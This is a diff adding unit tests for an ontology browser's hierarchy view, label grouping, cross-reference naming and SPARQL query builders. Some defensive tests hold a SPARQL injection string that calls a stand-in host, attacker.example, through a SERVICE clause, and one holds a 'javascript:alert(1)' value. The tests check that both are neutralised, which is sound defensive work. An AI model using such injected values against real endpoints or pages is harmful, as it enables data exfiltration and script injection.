@@ -21,6 +21,17 @@ import {
   mergePieces,
   namesQuery,
   neighbourhood,
+  hierarchyOf,
+  leadRest,
+  leadDisclosures,
+  labelKinds,
+  hiddenRows,
+  headQuery,
+  labelsWanted,
+  reuseQuery,
+  shortFormRepeats,
+  xrefName,
+  xrefsByDatabase,
   oboIri,
   parseCounts,
   parseDefinitions,
@@ -841,4 +852,530 @@ describe('languageCount', () => {
     expect(languageCount([{ lang: 'fr' }, { lang: 'de' }, { lang: null }])).toBe(3);
     expect(languageCount([])).toBe(0);
   });
+});
+
+describe('hierarchyOf', () => {
+  const X = 'http://x/';
+  const node = (id: string, focus?: boolean) => ({ id, label: id, focus });
+  const edge = (source: string, label: string, target: string) => ({
+    id: `${source} ${label} ${target}`,
+    source,
+    target,
+    label,
+    hierarchy: true,
+  });
+
+  it('keeps the parents and children of what neighbourhood emits, and not the axioms', () => {
+    const g = neighbourhood(
+      {
+        iri: X + 'c',
+        axioms: [
+          {
+            axiom: { type: 'SubClassOf', subClass: X + 'c', superClass: X + 'parent' },
+            ofn: '',
+            graph: 'default',
+          },
+          {
+            axiom: {
+              type: 'SubClassOf',
+              subClass: X + 'c',
+              superClass: { type: 'ObjectSomeValuesFrom', property: X + 'p', class: X + 'filler' },
+            },
+            ofn: '',
+            graph: 'default',
+          },
+        ],
+        mentions: { axioms: [], total: 0, truncated: false },
+        incoming: [
+          {
+            property: 'http://www.w3.org/2000/01/rdf-schema#subClassOf',
+            count: 1,
+            more: false,
+            subjects: [X + 'kid'],
+          },
+        ],
+        names: {},
+      } as never,
+      {},
+    );
+    expect(g.nodes.map((n) => n.id)).toContain(X + 'filler');
+    const h = hierarchyOf(g);
+    expect(h.nodes.map((n) => n.id).sort()).toEqual([X + 'c', X + 'kid', X + 'parent']);
+    // a child's edge has the entity as its target, and a parent's as its source
+    expect(h.edges.find((e) => e.source === X + 'kid')?.target).toBe(X + 'c');
+    expect(h.edges.find((e) => e.target === X + 'parent')?.source).toBe(X + 'c');
+  });
+
+  const restriction = (word: string, extra: object[] = []) =>
+    neighbourhood(
+      {
+        iri: X + 'c',
+        axioms: [
+          {
+            axiom: {
+              type: 'SubClassOf',
+              subClass: X + 'c',
+              superClass: { type: 'ObjectSomeValuesFrom', property: X + 'p', class: X + 'filler' },
+            },
+            ofn: '',
+            graph: 'default',
+          },
+          ...extra,
+        ],
+        mentions: { axioms: [], total: 0, truncated: false },
+        incoming: [],
+        names: { [X + 'p']: { label: word, shortForm: null, kinds: [], deprecated: false } },
+      } as never,
+      {},
+    );
+
+  it('takes a restriction on a property with a hierarchy word for no parent', () => {
+    for (const word of ['broader', 'subclass of', 'subproperty of']) {
+      const g = restriction(word);
+      // the expanded view keeps the edge under its label
+      expect(g.edges.map((e) => [e.target, e.label])).toEqual([[X + 'filler', word]]);
+      const h = hierarchyOf(g);
+      expect(h.edges, word).toEqual([]);
+      expect(h.nodes.map((n) => n.id)).toEqual([X + 'c']);
+    }
+  });
+
+  it('keeps a parent that is also the filler of such a restriction, in either order', () => {
+    const parent = {
+      axiom: { type: 'SubClassOf', subClass: X + 'c', superClass: X + 'filler' },
+      ofn: '',
+      graph: 'default',
+    };
+    const h = hierarchyOf(restriction('subclass of', [parent]));
+    expect(h.edges.map((e) => e.target)).toEqual([X + 'filler']);
+    const lineage = {
+      nodes: [{ id: X + 'c', label: 'c', focus: true }],
+      edges: [
+        {
+          id: `${X}c subclass of ${X}filler`,
+          source: X + 'c',
+          target: X + 'filler',
+          label: 'subclass of',
+          hierarchy: true,
+        },
+      ],
+    };
+    const plain = restriction('subclass of');
+    const edges = (a: typeof plain, b: typeof plain) => hierarchyOf(mergePieces(a, b)).edges;
+    expect(edges(plain, lineage)).toHaveLength(1);
+    expect(edges(lineage, plain)).toHaveLength(1);
+  });
+
+  it('keeps the first children and every parent', () => {
+    const kids = Array.from({ length: 9 }, (_, i) => `k${i}`);
+    const h = hierarchyOf(
+      {
+        nodes: [node('c', true), node('p1'), node('p2'), ...kids.map((k) => node(k))],
+        edges: [
+          ...kids.map((k) => edge(k, 'subclass of', 'c')),
+          edge('c', 'subclass of', 'p1'),
+          edge('c', 'subclass of', 'p2'),
+        ],
+      },
+      6,
+    );
+    expect(h.edges.filter((e) => e.target === 'c')).toHaveLength(6);
+    expect(h.edges.filter((e) => e.source === 'c')).toHaveLength(2);
+    expect(h.nodes).toHaveLength(9);
+    expect(h.nodes.map((n) => n.id)).not.toContain('k6');
+  });
+
+  it('reads broader and subproperty edges, and leaves out the neighbours of a neighbour', () => {
+    const piece = {
+      nodes: [node('c', true), node('p'), node('k'), node('sib'), node('far')],
+      edges: [
+        edge('c', 'broader', 'p'),
+        edge('k', 'subproperty of', 'c'),
+        // added by expanding the parent
+        edge('sib', 'broader', 'p'),
+        edge('p', 'broader', 'far'),
+      ],
+    };
+    const h = hierarchyOf(piece);
+    expect(h.nodes.map((n) => n.id).sort()).toEqual(['c', 'k', 'p']);
+    expect(h.edges).toHaveLength(2);
+  });
+
+  it('keeps the entity alone when it has no hierarchy', () => {
+    const h = hierarchyOf({
+      nodes: [node('c', true), node('o')],
+      edges: [{ ...edge('c', 'part of', 'o'), hierarchy: undefined }],
+    });
+    expect(h.nodes.map((n) => n.id)).toEqual(['c']);
+    expect(h.edges).toEqual([]);
+  });
+});
+
+describe('the identifiers rows', () => {
+  const x = (database: string, id: string) => ({
+    database,
+    id,
+    href: null,
+    value: `${database}:${id}`,
+  });
+  it('groups the references by database, in their order', () => {
+    expect(
+      xrefsByDatabase([x('FMA', '1'), x('PMID', '2'), x('PMID', '3'), x('Wikipedia', 'A')]).map(
+        (r) => [r.database, r.ids.map((i) => i.id)],
+      ),
+    ).toEqual([
+      ['FMA', ['1']],
+      ['PMID', ['2', '3']],
+      ['Wikipedia', ['A']],
+    ]);
+  });
+  it('hides rows past the limit, unless only one would hide', () => {
+    expect(hiddenRows(3, 8)).toBe(0);
+    expect(hiddenRows(8, 8)).toBe(0);
+    expect(hiddenRows(9, 8)).toBe(0);
+    expect(hiddenRows(10, 8)).toBe(2);
+    expect(hiddenRows(14, 8)).toBe(6);
+  });
+});
+
+describe('the texts after the lead', () => {
+  const v = (text: string, lang: string | null = 'en') =>
+    ({ value: { '@value': text }, lang, sources: [], types: [] }) as never;
+  const group = (kind: string, values: never[], translations: never[] = []) => ({
+    kind,
+    predicates: [`p:${kind}`],
+    values,
+    translations,
+  });
+  const lead = {
+    groups: [
+      group('Definition', [v('first'), v('second')], [v('fr', 'fr')]),
+      group('Description', [v('d')], [v('dfr', 'fr')]),
+      group('Comment', [v('c1'), v('c2')]),
+    ],
+  };
+  const notes = [{ kind: 'History note', property: 'p:h', values: [v('nfr', 'fr'), v('nen')] }];
+
+  it('leaves the lead and its translations out, and keeps every other value', () => {
+    const rows = leadRest(lead, notes, ['en']);
+    expect(rows.map((r) => [r.kind, r.values.length])).toEqual([
+      ['Definition', 1],
+      ['Description', 2],
+      ['Comment', 2],
+      ['History note', 2],
+    ]);
+  });
+  it('puts the reader’s language first in a note', () => {
+    const rows = leadRest({ groups: [] }, notes, ['en']);
+    expect(rows[0].values[0]).toEqual(v('nen'));
+  });
+  it('has no rows for a lone value', () => {
+    expect(
+      leadRest({ groups: [group('Definition', [v('only')], [v('fr', 'fr')])] }, [], []),
+    ).toEqual([]);
+  });
+  it('gives each kind that has values its own count, with "more" for the kind that leads', () => {
+    const labels = (rows: Parameters<typeof leadDisclosures>[0], kind: string) =>
+      leadDisclosures(rows, kind).map((d) => d.label);
+    expect(labels(leadRest(lead, notes, ['en']), 'Definition')).toEqual([
+      '1 more definition',
+      '2 descriptions',
+      '2 comments',
+      '2 notes',
+    ]);
+    expect(
+      labels(leadRest({ groups: [group('Comment', [v('a'), v('b')])] }, [], []), 'Comment'),
+    ).toEqual(['1 more comment']);
+    expect(
+      labels(leadRest({ groups: [group('Definition', [v('a')])] }, [], []), 'Definition'),
+    ).toEqual([]);
+  });
+  it('counts every other kind as a note, with its property kept apart', () => {
+    const rows = [
+      { kind: 'Scope note', predicates: ['skos:scopeNote'], values: [v('a')] },
+      { kind: 'Example', predicates: ['skos:example'], values: [v('b')] },
+    ];
+    const [d] = leadDisclosures(rows, 'Definition');
+    expect(d.label).toBe('2 notes');
+    expect(d.rows.map((r) => r.predicates[0])).toEqual(['skos:scopeNote', 'skos:example']);
+    expect(leadDisclosures(rows, 'Scope note')[0].label).toBe('2 more notes');
+  });
+});
+
+describe('the labels by kind', () => {
+  it('states a language and text once, and tells apart ones that run together', () => {
+    const [g] = labelKinds([
+      { lang: 'en', preferred: ['closure', 'closure'], alternative: [], hidden: [] },
+      { lang: '', preferred: ['enclosure'], alternative: [], hidden: [] },
+      { lang: 'en', preferred: ['closure'], alternative: [], hidden: [] },
+    ]);
+    expect(g.values).toEqual([
+      { text: 'closure', lang: 'en' },
+      { text: 'enclosure', lang: '' },
+    ]);
+  });
+  it('keeps every language and leaves out a kind with none', () => {
+    expect(
+      labelKinds([
+        { lang: 'en', preferred: ['Fish'], alternative: ['Fishes'], hidden: [] },
+        { lang: 'fr', preferred: ['Poissons'], alternative: [], hidden: [] },
+        { lang: '', preferred: [], alternative: ['Pisces'], hidden: [] },
+      ]),
+    ).toEqual([
+      {
+        kind: 'Preferred',
+        values: [
+          { text: 'Fish', lang: 'en' },
+          { text: 'Poissons', lang: 'fr' },
+        ],
+      },
+      {
+        kind: 'Alternative',
+        values: [
+          { text: 'Fishes', lang: 'en' },
+          { text: 'Pisces', lang: '' },
+        ],
+      },
+    ]);
+  });
+});
+
+describe('the name of a cross-reference', () => {
+  const OBO_IRI = 'http://purl.obolibrary.org/obo/CL_1';
+  const prefixes = { obo: 'http://purl.obolibrary.org/obo/' };
+  const none = () => null;
+  const name = (
+    value: string,
+    database = '',
+    id = value,
+    label: (i: string) => string | null = none,
+  ) => xrefName({ database, id, value }, label, prefixes);
+
+  it('takes the label this dataset gives the target first', () => {
+    expect(name(OBO_IRI, '', OBO_IRI, () => 'a cell')).toBe('a cell');
+  });
+  it('keeps an opaque id exact', () => {
+    expect(name('PMID:00000011', 'PMID', '00000011')).toBe('00000011');
+    expect(name('MESH:D000001', 'MESH', 'D000001')).toBe('D000001');
+    expect(name('FIXTURE:a_b%20c', 'FIXTURE', 'a_b%20c')).toBe('a_b%20c');
+    expect(name('plain')).toBe('plain');
+  });
+  it('asks for a label only of an IRI', () => {
+    const asked: string[] = [];
+    name('PMID:1', 'PMID', '1', (i) => (asked.push(i), 'no'));
+    expect(asked).toEqual([]);
+  });
+  it('reads a Wikipedia name as a title, as a reference or as an IRI', () => {
+    expect(
+      name('Wikipedia:Border-associated_macrophage', 'Wikipedia', 'Border-associated_macrophage'),
+    ).toBe('Border-associated macrophage');
+    expect(name('https://en.wikipedia.org/wiki/Foam_cell')).toBe('Foam cell');
+    expect(name('https://en.wikipedia.org/wiki/AC/DC')).toBe('AC/DC');
+    expect(name('https://en.wikipedia.org/wiki/Caf%C3%A9_au_lait')).toBe('Café au lait');
+  });
+  it('gives an IRI a prefixed name, or else its last part', () => {
+    expect(name(OBO_IRI)).toBe('obo:CL_1');
+    expect(name('https://example.org/refs/a%20b/')).toBe('a b');
+    expect(name('https://example.org/vocab#Thing')).toBe('Thing');
+    expect(name('https://doi.org/10.1000/xyz')).toBe('10.1000/xyz');
+    // not on another host's /wiki/, whose underscores may mean themselves
+    expect(name('https://example.org/wiki/a_b')).toBe('a_b');
+  });
+  it('keeps an IRI whole when no part of it names the target or decoding is not faithful', () => {
+    expect(name('https://example.org/page?id=5')).toBe('https://example.org/page?id=5');
+    expect(name('https://example.org/')).toBe('https://example.org/');
+    expect(name('https://example.org/a%2Fb')).toBe('a%2Fb');
+    expect(name('https://example.org/%E0%A4%A')).toBe('%E0%A4%A');
+  });
+  it('leaves an unsafe scheme as text and never reads it as an IRI', () => {
+    expect(name('javascript:alert(1)', 'javascript', 'alert(1)', () => 'no')).toBe('alert(1)');
+  });
+});
+
+describe('the short form beside the header IRI', () => {
+  const OBO = 'http://purl.obolibrary.org/obo/CL_0009001';
+  it('repeats a prefixed name whose local part it is', () => {
+    expect(shortFormRepeats('CL_0009001', OBO, 'obo:CL_0009001')).toBe(true);
+    expect(shortFormRepeats('insects', 'http://x/insects', 'th:insects')).toBe(true);
+  });
+  it('stays beside an IRI in full, with no prefix or by the switch', () => {
+    expect(shortFormRepeats('CL_0009001', OBO, OBO)).toBe(false);
+  });
+  it('stays when it differs from the local part', () => {
+    expect(shortFormRepeats('CL:0009001', OBO, 'obo:CL_0009001')).toBe(false);
+    expect(shortFormRepeats('obo', OBO, 'obo:CL_0009001')).toBe(false);
+  });
+});
+
+describe('values from the data in SPARQL', () => {
+  const ATTACK =
+    'http://example.org/x> } SERVICE <https://attacker.example/sparql> { ?s ?p ?d } } #';
+  const clean = (q: string) => {
+    // what cannot close the IRI stays inside it, percent-encoded
+    expect(q).not.toMatch(/\sSERVICE\s/);
+    expect(q).not.toContain('attacker.example/sparql>');
+  };
+  it('leaves out of a names query what is no IRI, and keeps the others', () => {
+    const q = namesQuery([ATTACK, 'http://example.org/ok', 'http://x/\u0001y', 'not an iri'], null);
+    clean(q);
+    expect(q).toContain('VALUES ?s { <http://example.org/ok> }');
+    expect(q).not.toContain('\u0001');
+    expect(q).not.toContain('not an iri');
+  });
+  it('writes a graph it is given so that it cannot close the IRI', () => {
+    clean(namesQuery(['http://example.org/ok'], ATTACK));
+    clean(namesQuery(['http://example.org/ok'], null, [ATTACK]));
+    clean(headQuery(ATTACK));
+    clean(definitionsQuery([ATTACK], null));
+    clean(definitionsQuery(['http://example.org/ok'], ATTACK));
+  });
+  it('writes the entity and property of the other queries so too', () => {
+    clean(reuseQuery(ATTACK));
+    clean(incomingQuery(ATTACK, ATTACK, ['default'], 0));
+    clean(incomingQuery('http://x/a', 'http://x/p', [ATTACK], 0));
+    clean(usageQuery(ATTACK, ['default'], 0));
+    // an ordinary IRI is written as it is
+    expect(reuseQuery('http://x/a#b')).toContain('<http://x/a#b>');
+  });
+  it('asks for labels only of valid IRIs that have none', () => {
+    expect(
+      labelsWanted(
+        [ATTACK, 'http://x/known', 'http://x/new', 'urn:a:b', 'PMID:1', 'http://x/new'],
+        { 'http://x/known': { label: 'known' } },
+      ),
+    ).toEqual(['http://x/new', 'urn:a:b']);
+  });
+  it('keeps a cross-reference that is no IRI as its plain value', () => {
+    const asked: string[] = [];
+    expect(
+      xrefName({ database: '', id: ATTACK, value: ATTACK }, (i) => (asked.push(i), 'no'), {}),
+    ).toBe(ATTACK);
+    expect(asked).toEqual([]);
+  });
+});
+
+describe('IRIs the SPARQL parser takes and refuses', () => {
+  const ATTACK =
+    'http://example.org/x> } SERVICE <https://attacker.example/sparql> { ?s ?p ?d } } #';
+  const NBSP = 'http://example.org/a\u00a0b';
+  const OK = 'http://example.org/ok';
+  it('keeps an IRI with a no-break space and leaves out what cannot be one', () => {
+    expect(labelsWanted([NBSP, ATTACK, 'http://example.org/a b'], {})).toEqual([NBSP]);
+    const q = namesQuery([NBSP, ATTACK, 'http://example.org/a b'], null);
+    expect(q).toContain(`VALUES ?s { <${NBSP}> }`);
+    expect(q).not.toContain('attacker.example');
+    expect(q).not.toContain('example.org/a b');
+  });
+  it('keeps the identity of a graph and a subject with a no-break space', () => {
+    expect(namesQuery([OK], NBSP)).toContain(`GRAPH <${NBSP}>`);
+    expect(headQuery(NBSP)).toContain(`GRAPH <${NBSP}>`);
+    expect(definitionsQuery([NBSP], null)).toContain(`<${NBSP}>`);
+    expect(reuseQuery(NBSP)).toContain(`<${NBSP}>`);
+    expect(reuseQuery(NBSP)).not.toContain('%A0');
+  });
+  it('reads the label of a cross-reference with a no-break space', () => {
+    expect(xrefName({ database: '', id: NBSP, value: NBSP }, () => 'named', {})).toBe('named');
+  });
+  // each of these fails a whole query at the server, so one must not cost the others their labels
+  it.each([
+    ['a stray percent sign', 'http://example.org/100%'],
+    ['a percent sign without hex digits', 'http://example.org/a%zz'],
+    ['a second fragment', 'http://example.org/a#b#c'],
+    ['brackets in a path', 'http://example.org/a[1]'],
+    ['a port that is no number', 'http://example.org:abc/a'],
+    ['an unclosed IPv6 host', 'http://[bad/a'],
+    ['a malformed IPv6 host', 'http://[1:2]/a'],
+    ['a C1 control', 'http://example.org/a\u0085b'],
+    ['DEL', 'http://example.org/a\u007fb'],
+    ['a private use character in a path', 'http://example.org/a\ue000b'],
+    ['a noncharacter', 'http://example.org/a\ufffeb'],
+  ])('leaves out %s', (_, bad) => {
+    expect(labelsWanted([bad, OK], {})).toEqual([OK]);
+    expect(namesQuery([bad, OK], null)).toContain(`VALUES ?s { <${OK}> }`);
+  });
+  it.each([
+    ['percent encoding', 'http://example.org/a%20b'],
+    ['one fragment', 'http://example.org/a#b'],
+    ['a query and a fragment', 'http://example.org/a?x=1&y=2#b'],
+    ['a port', 'http://example.org:8080/a'],
+    ['a URN', 'urn:a:b'],
+    ['letters beyond ASCII', 'http://example.org/caf\u00e9/\u{1F600}'],
+  ])('keeps %s', (_, good) => {
+    expect(labelsWanted([good], {})).toEqual([good]);
+  });
+});
+
+describe('line and paragraph separators in an IRI', () => {
+  const OK = 'http://example.org/ok';
+  const SEPARATORS = [String.fromCodePoint(0x2028), String.fromCodePoint(0x2029)];
+  it.each(SEPARATORS)('finds a bad port whatever follows it, with %j', (sep) => {
+    for (const bad of [
+      `http://example.org:abc/a#b${sep}c`,
+      `http://example.org:abc/a${sep}b`,
+      `http://example.org:abc/a?b${sep}c`,
+    ]) {
+      expect(labelsWanted([bad, OK], {})).toEqual([OK]);
+    }
+  });
+  it.each(SEPARATORS)('finds a second fragment after %j', (sep) => {
+    expect(labelsWanted([`http://example.org/a#b${sep}c#d`, OK], {})).toEqual([OK]);
+  });
+  it.each(SEPARATORS)('keeps an IRI with %j in its path, query or fragment', (sep) => {
+    const good = [
+      `http://example.org/a${sep}b`,
+      `http://example.org/a?b${sep}c`,
+      `http://example.org/a#b${sep}c`,
+    ];
+    expect(labelsWanted(good, {})).toEqual(good);
+  });
+});
+
+describe('the time to name a long cross-reference', () => {
+  // a quadratic scan takes many seconds at this length and a linear one a few milliseconds
+  const n = 100_000;
+  const shapes = (sep: string) => [
+    `http://${'a'.repeat(n)}#b${sep}c`,
+    `http://${'a'.repeat(n)}${sep}`,
+    `http://example.org/${'a'.repeat(n)}#${sep}`,
+    `http://example.org/${'a/'.repeat(n / 2)}${sep}`,
+    `http://example.org/${'%41'.repeat(n / 3)}${sep}`,
+    `http://en.wikipedia.org/wiki/${'_'.repeat(n)}${sep}`,
+    `https://doi.org/${'a'.repeat(n)}${sep}`,
+    `http://${'a.'.repeat(n / 2)}wikipedia.org/x${sep}`,
+  ];
+  it.each([String.fromCodePoint(0x2028), String.fromCodePoint(0x2029)])(
+    'stays linear with %j',
+    (sep) => {
+      for (const v of shapes(sep)) {
+        const start = performance.now();
+        xrefName({ database: '', id: v, value: v }, () => null, {});
+        expect(performance.now() - start).toBeLessThan(2000);
+      }
+    },
+    240_000,
+  );
+});
+
+describe('the time to check a long value from the data', () => {
+  // a quadratic check takes many seconds at this length and a linear one a few milliseconds
+  const n = 100_000;
+  const sep = String.fromCodePoint(0x2028);
+  it.each([
+    ['a long authority before a separator', `http://${'a'.repeat(n)}#b${sep}c`],
+    ['a long authority', `http://${'a'.repeat(n)}`],
+    ['many colons in an authority', `http://${'a:'.repeat(n)}/x`],
+    ['many at signs in an authority', `http://${'a@'.repeat(n)}/x`],
+    ['many fragments', `http://example.org/${'#'.repeat(n)}`],
+    ['a long scheme', `${'a'.repeat(n)}:b`],
+    ['a long value that ends badly', `http://example.org/${'a'.repeat(n)}>`],
+  ])(
+    'stays linear on %s',
+    (_, long) => {
+      const start = performance.now();
+      labelsWanted([long], {});
+      namesQuery([long], null);
+      expect(performance.now() - start).toBeLessThan(2000);
+    },
+    120_000,
+  );
 });
